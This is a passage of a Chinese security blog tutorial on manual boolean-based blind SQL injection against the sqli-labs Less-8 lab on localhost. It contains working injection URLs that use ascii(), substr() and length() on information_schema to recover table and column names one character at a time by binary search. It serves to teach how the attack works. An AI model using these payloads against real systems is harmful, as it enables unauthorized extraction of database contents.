+</div><div class="story post-story"><h2 id="确定表名的每一个字符所对应的ASCII码值"><a href="#确定表名的每一个字符所对应的ASCII码值" class="headerlink" title="确定表名的每一个字符所对应的ASCII码值"></a>确定表名的每一个字符所对应的ASCII码值</h2><p>在确定了每张表表名的字符串长度之后，我们就需要确定其每一个字符的具体值。但是表名有可能是字母、数字、标点符号、操作符、特殊字符等，倘若我们一个个尝试，效率会很低。因此我们会想到用ASCII码值来判断字符的具体值。每一个ASCII码对应一个字符，主要对应关系如下图：</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" data-fancybox="default" data-caption="ASCII码对应表"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ASCII码对应表"></a><span class="image-caption">ASCII码对应表</span></div></div>
+
+<p>我们这里以第四张表为例（问就是第四张表重要），在地址栏输入</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))) &gt; 96 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>其中，substr()函数作用为截取字符串中指定位置开始的指定个字符，用法为：substr(字符串,起始位置,截取长度)，起始位置从1开始。ascii()函数作用为取字符的ASCII码值，用法为ascii(字符)。因此上述语句作用为判断第4张表表名的第一个字符ASCII码值是否大于96。<br>结果发现页面显示提示文字，证明第4张表表名的第一个字符ASCII码值大于96，因此很大概率它是一个小写的英文字母。可以将<code>&gt; 96</code>改为<code>&lt; 123</code>尝试一下，发现的确如此。</p>
+<p>接着可以采用二分法来确定该字符的具体值。将<code>&lt; 123</code>改为<code>&gt; 110</code>发现页面显示提示文字，因此将111和122作为两个端点继续划分。将<code>&gt; 110</code>改为<code>&lt; 117</code>发现页面不显示提示文字。因此可以确定该字符为u,v,w,x,y,z中的一个，继续二分法或者枚举都可以得到：该字符为u。</p>
+<p>利用同样的方法，我们猜解得到第四张表的表名为<strong>users</strong>。同样地，我们也能够猜解出其他表名。</p>
+</div><div class="story post-story"><h2 id="确定表中字段数"><a href="#确定表中字段数" class="headerlink" title="确定表中字段数"></a>确定表中字段数</h2><p>与确定数据库中表数量的方法一致，只需将<code>table_name</code>替换为<code>column_name</code>，<code>information_schema.tables</code>替换为<code>information_schema.columns</code>，<code>table_schema=database()</code>替换为<code>table_name='users'</code>即可。如：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select column_name from information_schema.columns where table_name='users' limit 3,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现页面显示提示文字，证明users表中至少有4个字段。利用和上文一样的方法，最终可以知道users表中有6个字段。</p>
+</div><div class="story post-story"><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>确定字段的字符串长度，确定字段的每个字符具体值；确定记录数，确定记录的字符串长度，确定记录的每个字符具体值。方法与前文完全一致。有兴趣的小伙伴可以尝试一下继续手动猜解。</p>
+</div><div class="story post-story"><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本文主要目的是为读者厘清布尔盲注的原理和思路，实际上，手动进行布尔盲注效率十分低下，几乎用不到。但如果时间充裕，可以感受一下手动进行布尔盲注的过程，私以为这有助于更清晰地认识布尔盲注。</p>
+
+</div>]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>Web安全</tag>
       </tags>
   </entry>
 </search>
